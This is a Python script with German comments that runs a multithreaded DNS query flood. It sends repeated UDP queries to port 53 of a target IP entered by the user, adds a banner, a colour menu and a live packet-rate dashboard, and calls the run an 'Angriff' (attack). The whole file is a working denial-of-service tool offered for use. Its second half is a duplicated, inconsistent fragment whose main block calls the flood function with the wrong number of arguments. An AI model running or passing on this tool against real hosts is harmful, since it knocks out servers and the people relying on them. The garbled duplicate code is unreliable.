import os
import random
import socket
import sys
import threading
import time

# Globale Variablen
packet_counter = 0
counter_lock = threading.Lock()  # Verhindert Fehler beim gleichzeitigen Zählen
stop_event = threading.Event()


# Banner
def show_banner(color):
    os.system("clear")
    print(f"{color}")
    print(
        """
██████╗ ██████╗  
██╔══██╗██╔══██╗
██████╔╝██████╔╝
██╔═══╝ ██╔═══╝ 
██║     ██║     
╚═╝     ╚═╝      
    """
    )
    print("\033[0m")


# DNS Query Flood verstärken
def dns_flood(ip):
    global packet_counter
    server = (ip, 53)  # Port 53 für DNS ist Standard
    query = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Schleife stoppt, wenn ENTER gedrückt wird
    while not stop_event.is_set():
        try:
            sock.sendto(query, server)
            # Sicherer Zähler für Multithreading
            with counter_lock:
                packet_counter += 1
        except socket.error:
            time.sleep(0.1)  # Kleine Pause bei Netzwerkstress

    sock.close()


# Menü zur Farbauswahl
def choose_color():
    print("1 - Rot")
    print("2 - Grün")
    print("3 - Blau")
    print("4 - Standard")
    choice = input("Wähle eine Farbe: ")
    return {
        "1": "\033[91m",
        "2": "\033[92m",
        "3": "\033[94m",
        "4": "\033[0m",
    }.get(choice, "\033[0m")


# Live-Dashboard
def dashboard():
    global packet_counter
    start_time = time.time()
    while not stop_event.is_set():
        elapsed = time.time() - start_time
        rate = packet_counter / elapsed if elapsed > 0 else 0
        print(
            f"\r[INFO] Gesendete Pakete: {packet_counter} | Paketrate: {rate:.2f}/s",
            end="",
        )
        time.sleep(1)
    print("\n[INFO] Dashboard gestoppt.")


# Hauptprogramm
if __name__ == "__main__":
    color = choose_color()
    show_banner(color)

    while True:
        print("1 - DNS QUERY")
        print("2 - Beenden")
        choice = input(" [ Wähle eine Option ] : ")

        if choice == "2":
            print("[INFO] Programm beendet.")
            sys.exit()

        if choice == "1":  # DNS QUERY
            ip = input("Ziel-IP-Adresse: ")
            threads_count = int(input("Anzahl der Threads: "))

            # Zähler für einen neuen Durchgang zurücksetzen
            packet_counter = 0
            stop_event.clear()

            # Threads starten (Nur 'ip' übergeben, da Port 53 fest ist)
            attack_threads = [
                threading.Thread(target=dns_flood, args=(ip,))
                for _ in range(threads_count)
            ]
            for thread in attack_threads:
                thread.start()

            # Dashboard starten
            dashboard_thread = threading.Thread(target=dashboard)
            dashboard_thread.start()

            input("\n[INFO] Drücke ENTER, um den Angriff zu stoppen.\n")
            stop_event.set()

            # Warten, bis alle Threads sauber beendet sind
            for thread in attack_threads:
                thread.join()
            dashboard_thread.join()
            print("[INFO] Alle Threads erfolgreich beendet.\n")
    start_time = time.time()
    while not stop_event.is_set():
        elapsed = time.time() - start_time
        rate = packet_counter / elapsed if elapsed > 0 else 0
        print(f"\r[INFO] Gesendete Pakete: {packet_counter} | Paketrate: {rate:.2f}/s", end="")
        time.sleep(1)

# Hauptprogramm
if __name__ == "__main__":
    color = choose_color()
    show_banner(color)

    while True:
        print("1 - DNS QUERY")
        print("2 - Beenden")
        choice = input(" [ Wähle eine Option ] : ")

        if choice == "2":
            print("[INFO] Programm beendet.")
            sys.exit()

        if choice == "1": # DNS QUERY
            ip = input("Ziel-IP-Adresse: ")
            port = int(input("Ziel-Port: "))
            threads = int(input("Anzahl der Threads: "))

            stop_event.clear()

            # Threads starten
            attack_threads = [
                threading.Thread(target=dns_flood, args=(ip, port))
                for _ in range(threads)
            ]
            for thread in attack_threads:
                thread.start()

            # Dashboard starten
            dashboard_thread = threading.Thread(target=dashboard)
            dashboard_thread.start()

            input("\n[INFO] Drücke ENTER, um den Angriff zu stoppen.\n")
            stop_event.set()
